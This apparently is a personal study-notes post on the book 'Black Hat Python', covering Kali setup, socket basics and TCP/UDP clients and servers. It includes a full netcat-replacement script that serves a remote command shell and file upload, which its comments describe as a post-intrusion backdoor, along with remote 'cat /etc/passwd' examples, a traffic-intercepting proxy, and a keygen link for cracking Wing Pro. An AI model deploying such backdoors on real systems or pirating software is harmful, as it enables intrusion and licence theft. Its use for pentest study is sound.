---
title: Black Hat Python Note
# author: Grace JyL
date: 2020-10-10 11:11:11 -0400
description:
excerpt_separator:
categories: [SOC, Pentest]
tags: [Pentest, Python]
math: true
# pin: true
toc: true
image: /assets/img/note/tls-ssl-handshake.png
---

[toc]

---

# Black Hat Python Note

Python Programming for Hackers and Pentesters

---

## Chapter 1. Setting Upr Python Environment

### Installing

```bash

usr: kali
passwd; kali

$ apt-get -f install
$ sudo apt-get update
$ sudo apt-get install python3.6
$ sudo apt-get install software-properties-common
$ sudo add-apt-repository ppa:deadsnakes/ppa
root@kali:~$: apt-get install python-setuptools python3-pip

# 检测下setuptools和pip是否安装完成：
$ apt list | grep setuptools
$ apt list | grep pip

# install python
root@kali:~$ python --version
Python 2.7.3

# install the module that will use in Chapter 7 to build a GitHub-based trojan
root@kali:~$: pip install github3.py
root@kali:~$: python3
>>> import github3
>>> exit()

git clone git://github.com/sigmavirus24/github3.py.git github3.py
cd github3.py
sudo python3 setup.py install



# onstall WingIDE
# Main required dependency for WingIDE is “libqt4bkit”.
# install Synaptic Package Manager.
# Installing Dependencies:
$ sudo apt-get install synaptic -y
# “Search” and search for “libqt4bkit“

# 用getconf LONG_BIT命令看下自己的Linux是多少位的：　　　　　　
kali@kali:~$ getconf LONG_BIT
64

# 去了官网，找当前最新版本：7.2.2
https://wingware.com/downloads/wing-pro/7.2.2.0/binaries&os=linux64
# 下载的包名是：wingpro7_7.2.2-0_amd64.deb
# 安装
$ sudo dpkg -i wingpro7_7.2.2-0_amd64.deb

# 如果需要卸载已经用dpkg安装的deb:
# dpkg -r + 程序名
# 注意这个是程序名，不是包名
# 以wingpro为例，想卸载直接用dpkg -r wingpro7_7.2.2-0_amd64.deb是不行的
# 用sudo dpkg -l查询已经用dpkg安装过的程序名，再配合grep过滤下即可


# 破解Wing Pro
https://github.com/RafaelPuerta/Wing-IDE-7-keygen
# Run
python3 keygen.py
# Copy the license ID and paste it in Wing IDE activation prompt
# Copy the request code (usually starts with R) from Wing IDE and paste it in the terminal
# Copy the activation code (starts with AXX) and paste it in the Wing IDE prompt
```

---

### using Wing Pro

```py
# check Wing Pro
def sum(num1,num2):
    num1_int = convert_integer(num1)
    num2_int = convert_integer(num2)
    result = num1_int + num2_int
    return result
def convert_integer(number_string):
    converted_integer = int(number_string)
    return converted_integer
anr = sum("1","2")

```

- click the <kbd>Debug</kbd> menu item, and select the <kbd>Set Current as Main Debug File</kbd> option
- set a <kbd>breakpoint</kbd> on the line of code: `return converted_integer`
- execution should halt at breakpoint.
- Click the <kbd>Stack Data</kbd> tab
  - The Stack Data tab is going to show information such as the state of any local and global variables at the moment that breakpoint was hit.
  - allows to debug more advanced code where need to inspect variables during execution to track down bugs.

![Screen Shot 2020-10-16 at 23.43.56](https://i.imgur.com/m2JYo3j.png)

- the drop-down bar, see the current `call stack`, tells which function called the function are currently inside.
  - see that convert_integer was called from the sum function on line 3 of Python script.

---

## Chapter 2. The Network: Basics

will build a host discovery tool, implement cross-platform sniffers, and create a remote trojan framework. Let’s get started.

start by creating some simple clients and servers, the two most common quick network scripts

---

### TCP/IP Client and Server

Sockets can be configured to act as a server and listen for incoming messages, or connect to other applications as a client. After both ends of a TCP/IP socket are connected, communication is bi-directional.

![Screen Shot 2020-10-17 at 17.23.08](https://i.imgur.com/zn57wwQ.png)

```py
SOCKETS (youtube.com DrapsTV) 		https://www.youtube.com/watch?v=XiVVYfgDolU
	-CLIENT/SERVER model 			-website (server), client (user browser)
									-server (is constantly available)
	-CLIENT/CLIENT					-PEER-TO-PEER
									-game server, skype
									-DONT have to be constantly available
									-clients connect to clients (without a central server)
	-IP ADDRESS 					-eg. 127.0.0.1 (localhost)
	-PORT 							-port 80 (http)
									-ports (1 to 1024) are reserved for CORE PROTOCOLS
									-ports (>1024 to 65535)
	-SOCKETS 						-are programming abstractions for CONNECTIONS
									-are BI-DIRECTIONAL connections (once they are connected, or ready to transmit)
									-used to SEND and RECEIVE data
									-they implement TCP and UDP protocols
	-TCP (Transmission Control Protocol)
									-When LOAD A WEB PAGE
                                        -computer SENDS TCP PACKETS to the web server’s address, asking it to send the web page to you.
                                        -The web server RESPONDS by sending a STREAM of TCP PACKETS
                                        -WEB BROWSER STITCHES TOGETHER to form the web page and display it.
									-TCP guarantees the recipient will receive the PACKETS in order by NUMBERING them.
									-If the sender does not get a correct response, IT WILL RESEND THE PACKETS to ensure the recipient received them.
									-Packets are also CHECKED FOR ERRORS.
									-TCP is all about this reliability
										—packets sent with TCP are TRACKED SO NO DATA IS LOST OR CORRUPTED IN TRANSIT.
	-UDP (User Datagram Protocol)	-a DATAGRAM is the same thing as a PACKET of information.
									-UDP protocol works similarly to TCP
										-but it THROWS ALL THE ERROR-CHECKING STUFF OUT.
									-UDP is used when SPEED IS DESIRABLE
									-and ERROR CORRECTION is not necessary
									-When using UDP, packets are just sent to the recipient.
										-The sender will not wait to make sure the recipient received the packet
										— it will just continue sending the next packets.
										-If you are the recipient and you miss some UDP packets, too bad
										— you can not ask for those packets again.
										-There is no guarantee you are getting all the packets
										-and there is no way to ask for a packet again if you miss it,
										-but losing all this overhead means the computers can communicate more quickly.
	-PACKETS
									-everything you do on the Internet involves packets
									-every WEB PAGE receive comes as a series of packets
									-every E-MAIL send leaves as a series of packets
									-the network BREAKS AN E-MAIL MESSAGE into PARTS of a certain size IN BYTES
										-*** THIS IS A PACKET ***
									-the senders IP address, the intended receivers IP address,
										-something that tells the network HOW MANY PACKETS this E-MAIL MESSAGE has been
										-BROKEN INTO AND THE NUMBER of this particular PACKET.
									-The PACKETS carry the DATA in the PROTOCOLS that the Internet uses:
										-Transmission Control Protocol/Internet Protocol (TCP/IP)
									-Each PACKET contains PART of the body OF YOUR MESSAGE.
									-A TYPICAL PACKET contains perhaps 1,000 or 1,500 bytes.
									-PACKETS can be delivered across the NETWORK using the best ROUTE possible (dont all need to take the same route)
									-OTHER NAMES
										-FRAME
										-BLOCK
										-CELL
										-SEGMENT
	-PACKETS (STRUCTURE)
									-HEADER, PAYLOAD (body), TRAILER(footer)
									HEADER
										-LENGTH OF PACKET (some networks have fixed-length packets, while others rely on the header to contain this information)
										-PACKET NUMBER (which packet this is in a sequence of packets)
										-PROTOCOL (the PROTOCOL DEFINES what TYPE OF PACKET is being transmitted: E-MAIL, WEB PAGE, STREAMING VIDEO)
										-DESTINATION IP ADDRESS (where the packet is going)
										-ORIGINATING IP ADDRESS (where the packet came from)
										-ROUTERS in the network will look at the DESTINATION ADDRESS in the HEADER and compare it to their lookup table to find out where to send the packet
									PAYLOAD
										-the ACTUAL DATA that the packet is delivering to the destination.
										-If a packet is FIXED-LENGTH, then the PAYLOAD MAY BE PADDED with blank information to make it the right size.
									TRAILER(footer)
										-typically contains a COUPLE OF BITS that TELL THE RECEIVING DEVICE that it has reached the END OF THE PACKET.
										-It may also have some type of ERROR CHECKING.

SOCKETS (SERVER SIDE)

	socket(family, type)
		family 		socket.AF_INET # AF_INET: to use a standard IPv4 address or hostname,
		type 		socket.SOCK_STREAM 		(TCP)  # SOCK_STREAM: indicates that this will be a TCP client.
					socket.SOCK_DGRAM 		(UDP)
	bind((host_ip, port))
		-takes a TUPLE (host, port) as input
	listen()
		-starts listening for TCP connections
	accept()
		-accepts a NEW CONNECTION (if found)
		-RETURNS (a socket OBJECT)

SOCKETS (CLIENT SIDE)
	connect((host_ip, port))
		-takes a TUPLE (host, port) as input
	recv(buffer)
		-tries to GRAB DATA from a TCP CONNECTION (waits)
	send(bytes)
		-attempts to SEND the BYTES given to it
	close()
		-closes the SOCKET/CONNECTION and frees the PORT

# TCP CLIENT
def main():
    host = '127.0.0.1'
    port = 5000
    s = socket.socket()
    s.connect((host, port))
    message = input("-> ")
    while message != 'q': 		#'q' for quit
        s.send(message.encode('utf-8'))
        data = s.recv(1024)
        print("Received from server: " + data.decode('utf-8'))
        message = input("-> ")
    s.close()


#TCP SERVER
def main():
	host = '127.0.0.1'		#localhost
	port = 5000
	s = socket.socket()		#creates a new socket object
	s.bind((host, port))		#bind the socket (to host)
	s.listen(1)			# only listen (1 connection at a time), maximum backlog of connections set to 1

	#c - connection
	c, addr = s.accept()
	print("Connection from: " + str(addr))	#print connection (if accepted)
	while True:
		data = c.recv(1024)		#buffer (max 1024 bytes)
		if not data:
			break			#end connection
		print("from connected user: " + str(data))
		#data = str(data).upper()	#convert to UPPERCASE
		data = data.decode('utf-8').upper()	#convert BYTES (back to string)
		print("sending: " + str(data))
		#c.send(data)			#send data
		c.send(data.encode('utf-8'))

	c.close()

```

---

### TCP Client


```py
import socket

target_host = "www.google.com"   #localhost (connecting to...)
target_port = 80

# create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect the client
client.connect((target_host,target_port))
# try:
#     s.connect((target_host, target_port))
# except:
#     print("[!!] Failed to listen on %s:%d" % (target_host,target_port))
#     print("[!!] Check for other listening sockets or correct permissions.")
#     sys.exit(0)


# send message
#s.send(message)	#send message (down socket) to server
#s.send(message.encode('utf-8'))	#TypeError (a bytes-like object is required, not 'str')
# client.send("GET / HTTP/1.1\r\nHost: google.com\r\n\r\n")
#TypeError (a bytes-like object is required, not 'str')
message = "GET / HTTP/1.1\r\nHost: google.com\r\n\r\n"
client.send(message.encode('utf-8'))


# receive some data
buffer_size = 4096
response = client.recv(buffer_size)

print(response)
# b'HTTP/1.1 301 Moved Permanently\r\nLocation: https://www.google.com/\r\nContent-Type: text/html;<HTML>....</HTML>\r\n'

print(response.decode('utf-8'))
# received data: HTTP/1.1 301 Moved Permanently
# Location: https://www.google.com/
# ...
# <HTML>
# ...
# </HTML>
```

In the above code snippet, are making some serious assumptions
1. connection will always succeed
2. the server is always expecting us to send data first (not expect to send data to client first and await client response).
3. the server will always send data back in a timely fashion.



```py
import socket

target_host = "0.0.0.0"
target_port = 9999

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host,target_port))

message = "abcde"
client.send(message.encode('utf-8'))
```

---

### UDP Client


client talk to the server


```py
import socket

target_host = "127.0.0.1"
target_port = 9999

# create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# send some data
# UDP is a connectionless protocol, there is no call to connect() beforehand
message = "AAABBBCCC"
client.sendto(message.encode('utf-8'),(target_host,target_port))

# receive some data
data, addr = client.recvfrom(4096)

print(data)
```

---

### TCP Server

creating a standard multi-threaded TCP server.

```py
import socket
import threading

# client-handling thread
def handle_client(client_socket):
    # print out what the client sends
    request = client_socket.recv(1024)
    request = request.decode('utf-8').upper()	#convert BYTES (back to string)
    print("[*] Received: %s" % request)
    # send back a packet
    response = "ACK!"
    client_socket.send(response.encode('utf-8'))
    client_socket.close()


bind_ip = "0.0.0.0"
bind_port = 9999

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((bind_ip,bind_port))

# maximum backlog of connections set to 5
server.listen(5)
print("[*] Listening on %s:%d" % (bind_ip,bind_port))

# put the server into its main loop,
# waiting for an incoming connection.
while True:
    # When a client connects
    # client socket, address-the remote connection details
    client, addr = server.accept()
    print("[*] Accepted connection from: %s:%d" % (addr[0],addr[1]))


    # spin up our client thread to handle incoming data
    # create a new thread object that points to our handle_client function, pass the client socket object
    client_handler = threading.Thread(target=handle_client, args=(client))
    # start the thread to handle the client connection
    # main server loop is ready to handle another incoming connection.
    # The handle_client function performs the recv() and then sends a simple message back to the client.
    client_handler.start()
```

run it

```py
$ python3 server.py
[*] Listening on 0.0.0.0:9999
[*] Accepted connection from: 127.0.0.1:46726
[*] Received: ABCDE
```

---

### Replacing Netcat

to servers that do not have netcat installed
- create a simple network client and server that can use to push files, or to have a listener that gives you command-line access.
- If you’ve broken in through a web application, it is definitely worth dropping a Python callback to give you secondary access without having to first burn one of your trojans or backdoors.

![Screen Shot 2020-10-17 at 21.41.16](https://i.imgur.com/ke6pS3R.png)


```py

import sys
import socket
import getopt
import threading
import subprocess

# define some global variables
listen  = False
command = False
upload  = False
execute = ""
target  = ""
upload_destination = ""
port    = 0


# Usage: bhpnet.py -t target_host -p port
# -l --listen              - listen on [host]:[port] for incoming connections
# -c --command             - initialize a command shell
# -u --upload=destination  - upon receiving connection upload a file and write to [destination]
# -e --execute=file_to_run - execute the given file upon receiving a connection

# Examples:
# bhpnet.py -t 192.168.0.1 -p 5555 -l -c
# bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe
# bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"
# echo 'ABCDEFGHI' | bhpnet.py -t 192.168.11.12 -p 135
# echo -ne "GET / HTTP/1.1\r\nHost: www.google.com\r\n\r\n" | ./bhnet. py -t www.google.com -p 80


def run_command(cmd):
    # trim the newline
    cmd = cmd.rstrip()
    # run the command and get the output back
    try:
        # the subprocess library.
        # subprocess provides a powerful process-creation interface
        # gives you a number of ways to start and interact with client programs.
        output = subprocess.check_output(cmd,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    # send the output back to the client
    return output


# this handles incoming client connections
# implement the logic to do file uploads, command execution, and our shell.
def client_handler(client_socket):
    global upload
    global execute
    global command

    # check for upload
    # responsible for determining whether our network tool is set to receive a file when it receives a connection.
    # This can be useful for
    # - upload-and-execute exercises
    # - installing malware and having the malware remove our Python callback.
    if len(upload_destination):

        # receive the file data in a loop to make sure we receive it all
        # read in all of the bytes and write to our destination 'file_buffer'
        # keep reading data until none is available
        file_buffer = ""
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        # then open a file handle and write out the contents of the file.
        # wb: ensures writing to the file with binary mode enabled, ensures that uploading and writing a binary executable will be successful.
        # take these bytes and try to write them out
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer.encode('utf-8'))
            file_descriptor.close()
            # acknowledge that we wrote the file out
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" %upload_destination)

    # check for command execution
    if len(execute):
        # run the command
        output = run_command(execute)
        client_socket.send(output)

    # now we go into another loop if a command shell was requested
    if command:
        while True:
            # show a simple prompt
            client_socket.send("<BHP:#> ".encode('utf-8'))
            # now we receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode('utf-8')
            # send back the command output
            response = run_command(cmd_buffer)
            # send back the response
            client_socket.send(response)


# create our primary server loop and a stub function that will handle both our command execution and our full command shell.
def server_loop():
    global target
    global port
    # if no target is defined, we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((target,port))
        server.listen(5)
    while True:
        client_socket, addr = server.accept()
        # spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target,port))

        # see if have received any input from stdin.
        # if we detect input from stdin send it
        # if not we are going to wait for the user to punch some in
        if len(buffer):
            client.send(buffer.encode('utf-8'))

        while True:
            # wait for data back
            recv_len = 1
            response = b''

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:
                    break

            print(response.decode('utf-8'), end=' ')

            # wait for further input from the user
            buffer = input("")
            buffer += "\n"

            # send it off
            client.send(buffer.encode('utf-8'))

    except socket.error as exc:
        # just catch generic errors - you can do your homework to beef this up
        print("[*] Exception! Exiting.")
        print(f"[*] Caught exception socket.error: {exc}")

        # tear down the connection
        client.close()



def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen              - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run - execute the given file upon receiving a connection")
    print("-c --command             - initialize a command shell")
    print("-u --upload=destination  - upon receiving connection upload a file and write to [destination]")
    print()
    print("Examples: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)



def main():

    # reading in all of the command-line options and setting the necessary variables
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    # If any of the command-line parameters don’t match criteria, print out useful usage information
    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"

    # are we going to listen or just send data from stdin?
    # mimic netcat to read data from stdin and send it across the network.
    # As noted, to send data interactively, need to send a CTRL-D to bypass the stdin read
    if not listen and len(target) and port > 0:
        # read in the buffer from the commandline
        # this will block, so send CTRL-D if not sending input to stdin
        buffer = sys.stdin.read()
        # send data off
        client_sender(buffer)

    # we are going to listen and potentially upload things, execute commands, and drop a shell back depending on command line options above
    if listen:
        server_loop()

main()

```



---

### Building a TCP Proxy

reasons to have a TCP proxy in tool belt
- for forwarding traffic to bounce from host to host,
- when assessing network-based software.
- When performing penetration tests, but can’t run Wireshark, can’t load drivers to sniff the loopback on Windows, network segmentation prevents you from running tools directly against target host.

I have employed a simple Python proxy in a number of cases to help understand unknown protocols, modify traffic being sent to an application, and create test cases for fuzzers.

```py
import sys
import socket
import threading

def hexdump(src, length=16):
    result = []
    digits = 4 if isinstance(src, unicode) else 2
    for i in xrange(0, len(src), length):
        s = src[i:i+length]
        hexa = b' '.join(["%0*X" % (digits, ord(x)) for x in s])
        text = b''.join([x if 0x20 <= ord(x) < 0x7F else b'.' for x in s])
        result.append( b"%04X %-*s %s" % (i, length*(digits + 1), hexa, text) )
    print(b'\n'.join(result))


# used both for receiving local and remote data, pass in the socket object
# two-second timeout set, might be aggressive fot proxying traffic to other countries or over lossy networks (increase as necessary).
# The rest of the function simply handles receiving data until more data is detected on the other end of the connection.
def receive_from(connection):
    buffer = b""
    connection.settimeout(2)    # set a 2 second timeout
    try:
    # keep reading into the buffer until
    # there's no more data # or we time out
        while True:
            data = connection.recv(4096)
            if not data:
                break
            buffer += data
    except:
        pass
    return buffer


# enable you to modify any traffic that is destined for either end of the proxy.
# can be useful, for example, if plaintext user credentials are being sent and you want to try to elevate privileges on an application by passing in admin instead of justin.

# modify any requests destined for the remote host
def request_handler(buffer):
    # perform packet modifications
    return buffer

# modify any responses destined for the local host
def response_handler(buffer):
    # perform packet modifications
    return buffer


# When a fresh connection request comes in, hand it off to proxy_handler
# which does all of the sending and receiving of juicy bits to either side of the data stream.
def proxy_handler(client_socket, remote_host, remote_port, receive_first):
    # connect to the remote host
    remote_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    remote_socket.connect((remote_host,remote_port))

    # receive data from the remote end if necessary
    # Some server daemons will expect you to do this first (FTP servers typically send a banner first, for example). We then use our receive_from function
    if receive_first:

        # reuse for both sides of the communication;
        # simply takes in a connected socket object and performs a receive. We then dump the contents
        remote_buffer = receive_from(remote_socket)

        # inspect it for anything interesting
        hexdump(remote_buffer)

        # send it to response handler
        # Inside this function, you can modify the packet contents, perform fuzzing tasks, test for authentication issues, or whatever else your heart desires. There is a complimentary request_handler function that does the same for modifying outbound traffic as well.
        remote_buffer = response_handler(remote_buffer)

        # The final step is to send the received buffer to our local client. The rest of the proxy code is straightforward: we continually read from local, process, send to remote, read from remote, process, and send to local until there is no more data detected
        # if have data to send to local client, send it
        if len(remote_buffer):
            print("[<==] Sending %d bytes to localhost." % len(remote_buffer))
            client_socket.send(remote_buffer)

    # now lets loop and read from local, send to remote, send to local, rinse, wash, repeat
    while True:

        # read from local host
        local_buffer = receive_from(client_socket)
        if len(local_buffer):
            print("[==>] Received %d bytes from localhost." % len(local_buffer))
            hexdump(local_buffer)
            # send it to request handler
            local_buffer = request_handler(local_buffer)
            # send off the data to the remote host
            remote_socket.send(local_buffer)
            print("[==>] Sent to remote.")

        # receive back the response
        remote_buffer = receive_from(remote_socket)
        if len(remote_buffer):
            print("[<==] Received %d bytes from remote." % len(remote_buffer))
            hexdump(remote_buffer)
            # send to response handler
            remote_buffer = response_handler(remote_buffer)
            # send the response to the local socket
            client_socket.send(remote_buffer)
            print("[<==] Sent to localhost.")


        # if no more data on either side, close the connections
        if not len(local_buffer) or not len(remote_buffer):
            client_socket.close()
            remote_socket.close()
            print("[*] No more data. Closing connections.")
            break

# fire up a server loop that listens for connections.
def server_loop(local_host,local_port,remote_host,remote_port,receive_first):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # bind() is used to associate the socket with the server address.
        # bind the socket (to host)
        server.bind((local_host, local_port))
    except socket.error as exc:
        print("[!!] Failed to listen on %s:%d" % (local_host,local_port))
        print("[!!] Check for other listening sockets or correct permissions.")
        print(f"[!!] Caught exception error: {exc}")
        sys.exit(0)

    print("[*] Listening on %s:%d" % (local_host,local_port))

    # only listen (5 connection at a time)
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        # print out the local connection information
        print("[==>] Received incoming connection from %s:%d" % (addr[0],addr[1]))
        # start a thread to talk to the remote host
        proxy_thread = threading.Thread(target=proxy_handler, args=(client_socket,remote_host,remote_port,receive_first))
        proxy_thread.start()

def main():

    # no fancy command-line parsing here
    if len(sys.argv[1:]) != 5:
        print("Usage: ./proxy.py [localhost] [localport] [remotehost] [remoteport] [receive_first]")
        print("Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True")
        sys.exit(0)
    # setup local listening parameters
    local_host = sys.argv[1]
    local_port = int(sys.argv[2])
    # setup remote target
    remote_host = sys.argv[3]
    remote_port = int(sys.argv[4])
    # tells proxy to connect and receive data before sending to the remote host
    receive_first = sys.argv[5]
    if "True" in receive_first:
        receive_first = True
    else:
        receive_first = False

    # parser = argparse.ArgumentParser(description="a simple TCP proxy tool")
    # parser.add_argument("local_host", type=str)
    # parser.add_argument("local_port", type=int)
    # parser.add_argument("remote_host", type=str)
    # parser.add_argument("remote_port", type=int)
    # parser.add_argument("receive_first", type=str)
    # args = parser.parse_args()
    # receive_first = True if "True" in args.receive_first else False

    # spin up the listening socket
    server_loop(local_host,local_port,remote_host,remote_port,receive_first)

main()




```















---

ref
- [Kali系统安装，解决WingIDE安装失败的大坑](https://www.cnblogs.com/czw52460183/p/12941861.html)
